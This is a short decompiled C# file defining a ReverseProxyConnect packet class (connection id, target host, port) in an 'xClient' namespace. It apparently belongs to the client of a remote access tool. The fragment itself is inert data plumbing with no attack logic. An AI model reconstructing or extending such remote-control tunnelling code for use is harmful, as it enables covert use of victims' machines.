using System;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyConnect : GInterface4
{
	public int ConnectionId { get; set; }

	public string Target { get; set; }

	public int Port { get; set; }

	public ReverseProxyConnect()
	{
	}

	public ReverseProxyConnect(int connectionId, string target, int port)
	{
		ConnectionId = connectionId;
		Target = target;
		Port = port;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
